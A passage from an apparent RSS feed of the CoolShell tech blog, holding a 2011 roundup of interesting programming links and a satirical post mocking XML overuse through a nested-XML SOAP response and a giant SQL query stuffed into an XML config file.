<a href="https://coolshell.cn/articles/17998.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17998.html" class="wp_rp_title">Linux PID 1 和 Systemd</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17416.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17416.html" class="wp_rp_title">缓存更新的套路</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17200.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17200.html" class="wp_rp_title">Docker基础技术：DeviceMapper</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3489" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="b98a38c691">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>4</strong> 人打了分，平均分： <strong>2.50</strong> )<br><span class="post-ratings-text" id="ratings_3489_text"></span><meta itemprop="name" content="Linux的cycle日历（你懂的）">
<meta itemprop="headline" content="Linux的cycle日历（你懂的）">
<meta itemprop="description" content="这是一个开源项目：http://cycle.sourceforge.net/，其是用python写的。在项目的主页上说，这是一个给妇女用的日历程序，叫cycle，周期，给妇女的，我不多说了，你懂的。下面是一些介绍（请大家注意学习相关的英文单词）

当然，这个小程序不单单只是查看妇女的“周期”（menstruation），其还提供了以下的功能：

	第一次的周期 - 在日历上显示为粉色。me...">
<meta itemprop="datePublished" content="2011-01-17T08:42:09+08:00">
<meta itemprop="dateModified" content="2011-01-14T22:49:17+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3489.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3489.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="2.5">
<meta itemprop="ratingCount" content="4">
</div>
</div>
<div id="post-ratings-3489-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-01-17T08:42:09+08:00</pubDate>
<guid>https://coolshell.cn/articles/3489.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一些有意思的网站和贴子 ]]></title>
<link>https://coolshell.cn/articles/3480.html</link>
<content><![CDATA[ 
<p>各位朋友，又到了介绍各种杂项的时候了，正如以前的<a href="https://coolshell.cn/articles/3013.html" target="_blank">这篇</a>和<a href="https://coolshell.cn/articles/3437.html" target="_blank">这篇</a>文章一样，本篇文章也给你介绍一些最近出现的一些有趣的东西。希望你能喜欢。</p>
<ul>
<li>首先是<a href="https://online.wsj.com/article/SB10001424052748704723104576062173458318658.html?mod=WSJ_hps_sections_careerjournal#articleTabs%3Darticle" target="_blank">华尔街的一篇报道</a>，2011年最好和最不好的工作，其引用了<a href="http://careercast.com/" target="_blank">CareerCast.com</a>的数据，其列出了<a href="https://online.wsj.com/public/resources/documents/st_BESTJOBS0104_20110105.html" target="_blank">100个工作种类</a>，并根据薪资、工作环境、工作鸭梨、体力消耗和就业前景做了一个排序。结果<strong>排第一位的是“软件工程师”</strong>，其理由是：高科技产品的需求呈爆炸式增长，以及人们对iPod、平板电脑、和其它科技产品应用软件的喜好，软件工程师被评为最佳职业。软件工程师有弹性工作时间，可以在家办公，而且每个月都有猎头找来。而最差是的则是码头工人。</li>
</ul>
<div>
<div style="text-align: center;"><a href="https://online.wsj.com/public/resources/documents/st_BESTJOBS0104_20110105.html"><img alt="image placeholder" ></a></div>
</div>
<ul>
<li>接下来是一个叫<a href="http://www.theserverside.com/news/thread.tss?track=NL-461&amp;ad=808081&amp;thread_id=61622&amp;asrc=EM_NLN_13145929&amp;uid=2780877" target="_blank">“Java pass by value”的长贴</a>，楼主说有一天在LinkedIn.com上看到了Java Group里有人讨论Java是pass by value的，长达240+贴子。贴子里说，如果你使用Java的原始类型如int, long，就是传值，如果你用object, array，其实传的是一个引用的拷贝，所以，Java是传值的。呵呵，你觉得有道理吗？于是，成就了这个大讨论战。<a href="https://www.reddit.com/r/programming/comments/f1d7r/huge_war_over_whether_java_is_pass_by_reference/" target="_blank">reddit.com上也有N多的回贴</a>。有空可以看看。</li>
</ul>
<p><span id="more-3480"></span></p>
<ul>
<li>然后是两个网站，不知道你是否还记得我们介绍的那个<a rel="bookmark" href="https://coolshell.cn/articles/2065.html" target="_blank">Windows 3.1的Web网站</a>，用Web来实现一切看来是迟早的问题。下面，让我们来看两个网站：
<ul>
<li>第一个是仿MS-DOS的个人网站——<a href="http://stopwilson.com/" target="_blank">http://stopwilson.com/</a>
</li>
</ul>
</li>
</ul>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2011/01/msdos_website.jpg"><img alt="image placeholder" ></a> <a href="https://coolshell.cn/wp-content/uploads/2011/01/Javascript_ipad.jpg"></a></p>
<ul>
<li>
<ul>
<li>第二个是仿iPad的网站——<a href="http://alexw.me/ipad/" target="_blank">http://alexw.me/ipad/</a>
</li>
</ul>
</li>
</ul>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="padding-left: 60px;">如果以后的上网设备必然是以移动为主，那么Web开发中的HTML+ Javascript将有可能成为最所有应用都需要去支持的东西。</p>
<ul>
<li>说到Web开发，表单提交功能是每个网站都会最到的事情。这里有一篇文章告诉你了如何增强表单的可用性。非常不错，Web程序员可以前往一读：<a href="http://sixrevisions.com/user-interface/10-tips-for-optimizing-web-form-submission-usability/" target="_blank">http://sixrevisions.com/user-interface/10-tips-for-optimizing-web-form-submission-usability/</a>
</li>
</ul>
<div>
<ul>
<li>接下来，向大家介绍一个开源项目——TeleHash，其基于<a href="https://en.wikipedia.org/wiki/Kademlia">Kademlia</a>在<a href="https://en.wikipedia.org/wiki/Distributed_hash_table" target="_blank">DHT网络</a>上以P2P的方式用<a href="https://en.wikipedia.org/wiki/User_Datagram_Protocol" target="_blank">UDP协议</a>来发送一些<a href="https://www.json.org/" target="_blank">JSON数据</a>。于是你的应用程序就可以使用这个库来开发你的应用了。其源码在：<a href="https://github.com/quartzjer/TeleHash" target="_blank">https://github.com/quartzjer/TeleHash</a>，它的口号是：JSON + UDP + DHT = Freedom</li>
</ul>
</div>
<ul>
<li>如果你想使用autotools（autoconf和automake）写Makefile，这里有一个非常不错的教程：<a href="http://www.lrde.epita.fr/~adl/autotools.html" target="_blank">http://www.lrde.epita.fr/~adl/autotools.html</a>
</li>
</ul>
<ul>
<li>不知道大家知不知道微软xbox 360上的<a href="http://www.xbox.com/en-US/kinect" target="_blank">Kinect</a>？其是XBox的一个硬件插件，有点类似于Wii，不过它的强大之处在于，你只需要用你的肢体动作就可以玩游戏了，不需要手上拿个什么。现在，几乎全世界的程序员都在hack这个东东，有人还用他玩WoW，也是强大。这里有一个教程教你如何通过<a href="http://openkinect.org/" target="_blank">openkinect.org</a>和C#开发点自己的小玩意。</li>
</ul>
<ul>
<li>相试着写一个最简单的操作系统吗？这里有<a href="http://mikeos.berlios.de/write-your-own-os.html" target="_blank">一篇教程</a>教你用x86的汇编做一个操作系统，如果你想走得更远，可以看看<a href="http://mikeos.berlios.de/" target="_blank">MikeOS project</a>。</li>
</ul>
<p style="text-align: center;"><a href="http://mikeos.berlios.de/"><img alt="image placeholder" ></a></p>
<ul>
<li>下面是一个HTML5 Canvas Cheat Sheet（点击看大图），关于更多的Cheat Sheet，你可以看看《<a href="https://coolshell.cn/articles/1566.html" target="_blank">程序员小抄大全</a>》《<a rel="bookmark" href="https://coolshell.cn/articles/2964.html" target="_blank">25个jQuery的编程小抄</a>》</li>
</ul>
<figure id="attachment_3492" aria-describedby="caption-attachment-3492" style="width: 300px" class="wp-caption aligncenter"><a href="https://coolshell.cn/wp-content/uploads/2011/01/HTML5_Canvas_Cheat_Sheet.png"><img alt="image placeholder" ></a><figcaption id="caption-attachment-3492" class="wp-caption-text">HTML5 Canvas Cheat Sheet</figcaption></figure>
<ul>
<li>
<a href="http://monodroid.net/" target="_blank">Mono开始支持Android</a>。Mono是一个由Novell公司（先前是Ximian）主持的项目。该项目的目标是创建一系列符合ECMA标准（Ecma-334和Ecma-335）的.NET工具，包括C#编译器和共通語言執行平臺。与微软的.NET Framework不同，Mono项目不仅可以运行于Windows系统上，还可以运行于Linux，FreeBSD，Unix，Mac OS X和Solaris。这个项目叫MonoDroid。</li>
</ul>
<p style="text-align: center;"><a href="http://monodroid.net/"><img alt="image placeholder" ></a></p>
<p style="text-align: center;"> </p>
<ul>
<li>最后来一个给力的教程吧，这是一个关于教你如何制作一个<a href="http://daid.mine.nu/instructabliss/?url=http://www.instructables.com/id/Led-Cube-8x8x8/" target="_blank">3D的LED显示的教程</a>，相当的详细，甚至教你如何上ebay采购相关的电子元件和设备，还有如何编程，有兴趣的朋友可以一读。</li>
</ul>
<p style="text-align: center;"><a href="http://daid.mine.nu/instructabliss/?url=http://www.instructables.com/id/Led-Cube-8x8x8/"><img alt="image placeholder" ></a></p>
<p style="text-align: center;"> </p>
<p style="text-align: left;">这回就这么多，希望你喜欢。</p>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20276.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_title">别让自己“墙”了自己</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19612.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19612.html" class="wp_rp_title">50年前的登月程序和程序员有多硬核</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19464.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19464.html" class="wp_rp_title">如何超过大多数人</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3480" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="1b500fbf03">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>9</strong> 人打了分，平均分： <strong>3.78</strong> )<br><span class="post-ratings-text" id="ratings_3480_text"></span><meta itemprop="name" content="一些有意思的网站和贴子">
<meta itemprop="headline" content="一些有意思的网站和贴子">
<meta itemprop="description" content="各位朋友，又到了介绍各种杂项的时候了，正如以前的这篇和这篇文章一样，本篇文章也给你介绍一些最近出现的一些有趣的东西。希望你能喜欢。

	首先是华尔街的一篇报道，2011年最好和最不好的工作，其引用了CareerCast.com的数据，其列出了100个工作种类，并根据薪资、工作环境、工作鸭梨、体力消耗和就业前景做了一个排序。结果排第一位的是“软件工程师”，其理由是：高科技产品的需求呈爆炸式增长，...">
<meta itemprop="datePublished" content="2011-01-18T08:53:24+08:00">
<meta itemprop="dateModified" content="2011-02-27T18:35:02+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3480.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3480.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.78">
<meta itemprop="ratingCount" content="9">
</div>
</div>
<div id="post-ratings-3480-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-01-18T08:53:24+08:00</pubDate>
<guid>https://coolshell.cn/articles/3480.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 信XML，得自信 ]]></title>
<link>https://coolshell.cn/articles/3498.html</link>
<content><![CDATA[ 
<p>XML可能是计算有史以来最NB的发明了，以至于我们以没有XML的程序是难登大堂的程序，不用XML，你都不好意思当程序员。于是，我们看到了<a href="https://coolshell.cn/articles/2504.html" target="_blank">很多很雷人的用法</a>（《信XML，得永生》），当然一些朋友当时并没有看懂，不过我不怪大家，因为我们依然深信使用XML可以让你有强大的Zhuangbility，于是我们有下面这两种相当Geiliable的用法。</p>
<h4>一、XML中的XML</h4>
<p>这个例子是某公司的一个SOAP实现——我们的Webservice需要返回一个XML字符串，这怎么办呢？其实很容易，因为——XML是无所不能的，那怕是封装自己。</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;!-- ED: soap envelope omitted for readability --&gt;
&lt;string xmlns="urn:Initech.Global.Services"&gt;
  &amp;lt;CompanyGetConnector&amp;gt;
    &amp;lt;xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"&amp;gt;
      &amp;lt;xs:element name="InitechGetConnector"&amp;gt;
        &amp;lt;xs:complexType&amp;gt;
          &amp;lt;xs:choice maxOccurs="unbounded"&amp;gt;
            &amp;lt;xs:element name="employees"&amp;gt;
              &amp;lt;xs:complexType&amp;gt;
                &amp;lt;xs:sequence&amp;gt;
                  &amp;lt;xs:element name="EmployerName" type="xs:string" minOccurs="0"/&amp;gt;
                  &amp;lt;xs:element name="Employee" type="xs:string" minOccurs="0"/&amp;gt;
                  &amp;lt;xs:element name="Firstname" type="xs:string" minOccurs="0"/&amp;gt;
                  &amp;lt;xs:element name="Prefix" type="xs:string" minOccurs="0"/&amp;gt;
                  &amp;lt;xs:element name="Lastname" type="xs:string" minOccurs="0"/&amp;gt;
                  &amp;lt;xs:element name="Org._unit" type="xs:string" minOccurs="0"/&amp;gt;
                  &amp;lt;xs:element name="Function" type="xs:string" minOccurs="0"/&amp;gt;
                  &amp;lt;xs:element name="E-mail_work" type="xs:string" minOccurs="0"/&amp;gt;
                  &amp;lt;xs:element name="Telephone_work" type="xs:string" minOccurs="0"/&amp;gt;
                  &amp;lt;xs:element name="Mobile_work" type="xs:string" minOccurs="0"/&amp;gt;
                  &amp;lt;xs:element name="Birthdate" type="xs:date" minOccurs="0"/&amp;gt;
                  &amp;lt;xs:element name="Hired_since__irt._yearsemployed_" type="xs:date" minOccurs="0"/&amp;gt;
                  &amp;lt;xs:element name="Image" type="xs:base64Binary" minOccurs="0"/&amp;gt;
                &amp;lt;/xs:sequence&amp;gt;
              &amp;lt;/xs:complexType&amp;gt;
            &amp;lt;/xs:element&amp;gt;
          &amp;lt;/xs:choice&amp;gt;
        &amp;lt;/xs:complexType&amp;gt;
      &amp;lt;/xs:element&amp;gt;
    &amp;lt;/xs:schema&amp;gt;

    &amp;lt;employees&amp;gt;
      &amp;lt;EmployerName&amp;gt;
        My Client
      &amp;lt;/EmployerName&amp;gt;
      &amp;lt;Employee&amp;gt;
        100001
      &amp;lt;/Employee&amp;gt;
    &amp;lt;/employees&amp;gt;
  &amp;lt;/CompanyGetConnector&amp;gt;
&lt;/string&gt;
</pre>
<br>
<span id="more-3498"></span>
<h4>二、一切皆为配置</h4>
<p>没有hard code这是一个优秀程序员在入门时就要学习的，对于Hard Coder的东西最好写在配置文件中，这样修改这些参数就不需要修改代码而需要重新编译了。自从有了XML之后，我们的配置文件就不在使用像ini文件或是Unix下在conf文件那样的易读，我们认为，使用XML作为配置文件的格式是大势所趋，而且，我们要让我们的代码尽量的可以高度的配置，于是我们出现了下面的代码——这是一个强大的尝试，其标志着，我们完全可以以不久的未来用XML来编写一切语言的代码。</p>
<p>注：下面的代码最强大的应该是XML中的那个SQL。</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;add key="sqlSource" value="
    SELECT TOP REPLACE_NUMBER_OF_ROWS_TO_RETRIEVE
           History.handle AS ID_FAX_LOG,
           CASE isnumeric(SUBSTRING (Notes_Doc.Text ,1,8))
              WHEN 1 then SUBSTRING (Notes_Doc.Text ,1,8)
              ELSE NULL END AS ID_STAGE,
           DocumentUsers.UserName AS NM_DOCUMENTUSER_USERNAME,
           DocumentUsers.UserID AS TXT_DOCUMENTUSER_USERID,
           DocumentUserGroups.GroupID AS TXT_DOCUMENTUSERGROUP_GROUPID,
           Documents.UniqueID AS TXT_DOCUMENTS_UNIQUE_ID,
           History.TRDateTime AS DT_HISTORY_TRANSACTION_DATE,
           CASE COALESCE(HistoryPrint.handle,0)
              WHEN 0 THEN
                 CASE COALESCE(HistoryGeneric.handle,0)
                    WHEN 0 THEN
                       CASE COALESCE(HistoryTRX.handle,0)
                          WHEN 0 THEN '??'
                          ELSE
                             CASE (Documents.Flags &amp; 0x10)
                                WHEN 0 THEN 'Send'
                                ELSE 'Recieve'
                                END
                          END
                    ELSE CAST(HistoryGeneric_Short.Data AS varchar(32))
                    END
              ELSE 'Print'
              END AS TXT_TRANSACTION_TYPE,

           CASE COALESCE(HistoryPrint.handle,0)
              WHEN 0 THEN
                 CASE COALESCE(HistoryGeneric.handle,0)
                    WHEN 0 THEN
                       CASE COALESCE(HistoryTRX.handle,0)
                          WHEN 0 THEN '??'
                          ELSE
                             CASE Documents_Term.TermStatStr
                                WHEN 'Success' THEN 'Success'
                                ELSE 'Fail'
                                END
                          END
                    ELSE
                       CASE HistoryGeneric.ErrCode
                          WHEN 0 THEN 'Success'
                       ELSE 'Fail'
                       END
                    END
              ELSE
                 CASE SUBSTRING(HistoryPrint.Msg,1,7)
                    WHEN 'Success' THEN 'Success'
                    ELSE 'Fail'
                    END
              END AS TXT_TRANSACTION_STATUS,

           CASE COALESCE(HistoryPrint.handle,0)
              WHEN 0 THEN
                 CASE COALESCE(HistoryGeneric.handle,0)
                    WHEN 0 THEN
                       CASE COALESCE(HistoryTRX.handle,0)
                          WHEN 0 THEN '??'
                          ELSE COALESCE(HistoryTRX_Term.TermStatStr,CONVERT(varchar,Documents.TermStat))
                          END
                    ELSE REPLACE(REPLACE(CAST(HistoryGeneric_Detail.Data AS varchar(192)) ,'\t',''), '~u', HistoryGeneric.UserID )
                    END
              ELSE HistoryPrint.Msg
              END AS TXT_TRANSACTION_MESSAGE,

           CASE COALESCE(HistoryPrint.handle,0)
              WHEN 0 THEN
                 CASE COALESCE(HistoryGeneric.handle,0)
                    WHEN 0 THEN
                       CASE COALESCE(HistoryTRX.handle,0)
                          WHEN 0 THEN Documents.ElapsedSendTime
                          ELSE
                             CASE COALESCE(HistoryTRX.handle,0)
                                WHEN 0 THEN Documents.ElapsedSendTime
                                ELSE HistoryTRX.ElapsedTime
                                END
                          END
                    ELSE NULL
                    END
              ELSE HistoryPrint.TimeToPrint
              END AS NBR_TRANSACTION_ELAPSEDTIME,

           CASE COALESCE(HistoryGeneric.handle,0)
              WHEN 0 THEN
                 CASE substring(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE
                               (REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(
                                  Documents.Destination,' ',''),')',''),'(',''),
                                  '-',''),'/',''),'.',''),'*',''),',',''),';',''),
                                  '\',''),'-',''),1,1)
                    WHEN '1' THEN substring(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(
                                            REPLACE(REPLACE(REPLACE( REPLACE(REPLACE(
                                            REPLACE(Documents.Destination,' ',''),')',
                                            ''),'(',''),'-',''),'/',''),'.',''),'*',''),
                                            ',',''),';',''),'\',''),'-',''), 2, len(
                                            REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(
                                            REPLACE(REPLACE(REPLACE( REPLACE(REPLACE(
                                            REPLACE(Documents.Destination,' ',''),')',
                                            ''),'(',''),'-',''),'/',''),'.',''),'*','')
                                            ,',',''),';',''),'\',''),'-','')) )
                    ELSE REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(
                         REPLACE(REPLACE(REPLACE(Documents.Destination,' ',''),'-',''),')',
                         ''),'(',''),'/',''),'.',''),'*',''),',',''),';',''),'\',''),'-','')
                    END
              ELSE HistoryGeneric.UserID
              END AS TXT_TRANSACTION_DESTINATION,

           CASE (Documents.Flags &amp; 0x8)
              WHEN 0 THEN 'N'
              ELSE 'Y' END AS NBR_DOCUMENTS_DELETED,

           CASE (Documents.Flags &amp; 0x4)
              WHEN 0 THEN 'N'
              ELSE 'Y' END AS NBR_DOCUMENTS_VIEWED,

           /* Fax Destination */
           Documents.ToName AS TXT_DOCUMENTS_TO_NAME,
           Documents.ToContactNum AS TXT_DOCUMENTS_TO_CONTACT_NUM,
           Documents.ToCompany AS TXT_DOCUMENTS_TO_COMPANY,
           Documents.ToCityState AS TXT_DOCUMENTS_TO_CITY_STATE,
           Documents.FaxDIDNum AS TXT_DOCUMENTS_FAX_DID_NUM,
           Documents.FromPhoneNum AS TXT_DOCUMENTS_FROM_PHONE_NUM,
           Documents.GeneralFaxNum AS TXT_DOCUMENTS_GENERAL_FAX_NUM,
           HistoryPrint.NetPrintID AS TXT_HISTORYPRINT_NETPRINTID,

           /* Number of pages */
           DocFiles.NumPages AS NBR_DOCFILES_TOTAL_PAGE_COUNT,
           HistoryTRX.GoodPageCount AS NBR_HISTORYTRX_GOOD_PAGE_COUNT,
           HistoryTRX.BadPageCount AS NBR_HISTORYTRX_BAD_PAGE_COUNT,
           HistoryPrint.PagesPrinted AS NBR_HISTORYPRINT_PAGESPRINTED,
           HistoryPrint.CopiesPrinted AS NBR_HISTORYPRINT_COPIESPRINTED,
           /* location of fax image */ DTConfigurations.ServerName AS TXT_DOCFILES_SERVER_NAME,
           DTConfigurations.ImageDir AS TXT_DOCFILES_IMAGE_DIR,
           DocFiles.BodyFilename AS TXT_DOCFILES_BODY_FILENAME,
           Documents.FCSFile AS TXT_DOCFILES_FCS_FILE,
           REPLACE( DTConfigurations.ImageDir, 'D:\Data', '\\'+ServerName )
              + '\'+DocFiles.BodyFilename+'*' AS TXT_DOCFILES_PATH_BODY_NAME,
           REPLACE( DTConfigurations.ImageDir, 'D:\Data', '\\'+ServerName )
              + '\'+Documents.FCSFile+'*' AS TXT_DOCUMENTS_PATH_FCSFILE,
           Notes_Doc.Text AS TXT_NOTES_DOC_TEXT,
           Notes_CCList.Text AS TXT_NOTES_CCLIST_TEXT,
           DocumentUsers.RouteInfo AS TXT_DOCUMENTUSER_ROUTEINFO,
           DocumentUsers.RouteType AS NBR_DOCUMENTUSER_ROUTETYPE,
           DocumentUsers.EmailAddr AS TXT_DOCUMENTUSER_EMAILADDR,

           /* misc Documents data */
           Documents.CreationTime AS DT_DOCUMENTS_CREATION_TIME,
           Documents.FRFlags2 AS NBR_DOCUMENTS_FRFLAGS2,
           Documents.Flags AS NBR_DOCUMENTS_FLAGS,
           Documents.ErrorCode AS NBR_DOCUMENTS_ERROR_CODE,
           Documents.TermStat AS NBR_DOCUMENTS_TERMSTAT,

           /* misc HistoryTRX data */
           HistoryTRX.RemoteID AS TXT_HISTORYTRX_REMOTE_ID,
           HistoryTRX.RemoteServer AS TXT_HISTORYTRX_REMOTE_SERVER,
           HistoryTRX.Flags AS NBR_HISTORYTRX_FLAGS,
           HistoryTRX.TermStat AS NBR_HISTORYTRX_TERMSTAT,

           /* misc HistoryTRX data */
           HistoryGeneric.ErrCode AS NBR_HISTORYGENERIC_ERRCODE,
           HistoryGeneric.GenType AS NBR_HISTORYGENERIC_GENTYPE,
           HistoryGeneric.UserID AS TXT_HISTORYGENERIC_USERID,

           /* Handles */ Documents.handle AS ID_DOCUMENTS_HANDLE,
           History.handle AS ID_HISTORY_HANDLE,
           HistoryTRX.handle AS ID_HISTORYTRX_HANDLE,
           HistoryGeneric.handle AS ID_HISTORYGENERIC_HANDLE,
           HistoryPrint.handle AS ID_HISTORYPRINT_HANDLE

    FROM Documents
            INNER JOIN Users DocumentUsers ON Documents.OwnerID = DocumentUsers.handle
            INNER JOIN History ON Documents.handle = History.Owner
            LEFT OUTER JOIN DocFiles ON Documents.DocFileDBA = DocFiles.handle
            LEFT OUTER JOIN Groups DocumentUserGroups ON DocumentUsers.GroupID = DocumentUserGroups.handle
            LEFT OUTER JOIN HistoryPrint ON HistoryPrint.handle = History.handle
            LEFT OUTER JOIN HistoryGeneric ON HistoryGeneric.handle = History.handle
            LEFT OUTER JOIN Notes Notes_Doc ON Notes_Doc.handle = Documents.NoteDBA
            LEFT OUTER JOIN Notes Notes_CCList ON Notes_CCList.handle = Documents.CCListDBA
            LEFT OUTER join DTConfigurations ON DTConfigurations.ServerGUID = Documents.ServerGUID
            LEFT OUTER JOIN Globalization HistoryGeneric_Detail ON
               HistoryGeneric_Detail.Namespace = 'RightFax.SQL.HistoryGeneric'
               AND SUBSTRING(HistoryGeneric_Detail.LocKey,5,20) = 'DetailMsg'
               AND SUBSTRING(HistoryGeneric_Detail.LocKey,1,3) = CAST(HistoryGeneric.GenType AS varchar)
               AND HistoryGeneric_Detail.IsoLanguageName = 'en-us'
            LEFT OUTER JOIN Globalization HistoryGeneric_Short ON
               HistoryGeneric_Short.Namespace = 'RightFax.SQL.HistoryGeneric'
               AND SUBSTRING(HistoryGeneric_Short.LocKey,5, 20) = 'ShortMsg'
               AND SUBSTRING(HistoryGeneric_Short.LocKey,1, 3) = CAST(HistoryGeneric.GenType AS varchar)
               AND HistoryGeneric_Short.IsoLanguageName = 'en-us'
            LEFT OUTER JOIN HistoryTRX ON HistoryTRX.handle = History.handle
            LEFT OUTER JOIN (
               SELECT distinct CONVERT(varchar,G.Data) AS TermStatStr,
                      T.StatusCode AS TermStatCode,
                      T.handle AS TermStat
                 FROM Globalization G
                         INNER JOIN TermStatToStatusCode T ON
                            ( G.LocKey = 'HistoryTRX.BTHUSTAT'
                                 + RIGHT('0000'
                                 + LTRIM(RTRIM(CONVERT(char(3),T.StatusCode))), 3)
                              AND G.IsoLanguageName = 'en-us'
                              AND G.LocKey like 'HistoryTRX.BTHUSTAT%' )
                  ) AS HistoryTRX_Term ON HistoryTRX.TermStat = HistoryTRX_Term.TermStat
            LEFT OUTER JOIN (
               SELECT distinct CONVERT(varchar,G.Data) AS TermStatStr,
                      T.StatusCode AS TermStatCode,
                      T.handle AS TermStat
                 FROM Globalization G
                         INNER JOIN TermStatToStatusCode T ON
                            ( G.LocKey = 'HistoryTRX.BTHUSTAT'
                                 + RIGHT('0000'
                                 + LTRIM(RTRIM(CONVERT(char(3),T.StatusCode))), 3)
                              AND G.IsoLanguageName = 'en-us'
                              AND G.LocKey like 'HistoryTRX.BTHUSTAT%' )
                  ) AS Documents_Term ON Documents.TermStat = Documents_Term.TermStat
    WHERE
       NOT (
          /* The outer join on the HistoryPrint, HistoryGeneric, and HistoryTRX results in
           * rows that just have null history data. One of the three must have a value. If
           * all are null, the row is a result of the outer joins and the rows have no useable data so they
           * filtered out. */
          HistoryTRX.handle IS NULL
             AND HistoryGeneric.handle IS NULL
             AND HistoryPrint.handle IS NULL )
       AND DocumentUsers.UserName IS NOT NULL

       /* THIS VALUE is inserted into a NON NULL column in the FAX_LOG table. */
       AND DocumentUsers.UserID IS NOT NULL

       /* THIS VALUE is inserted into a NON NULL column in the FAX_LOG table. */
       AND Documents.UniqueID IS NOT NULL

       /* THIS VALUE is inserted into a NON NULL column in the FAX_LOG table. */
       AND History.TRDateTime &gt; 'REPLACE_WHERE_CLAUSE_CRITERIA'
   ORDER BY History.TRDateTime"
/&gt; </pre>
<p>来源：<a href="http://thedailywtf.com/Articles/All-In-The-Config.aspx" target="_blank">文章一</a>，<a href="http://thedailywtf.com/Articles/XMLd-XML.aspx" target="_blank">文章二</a></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
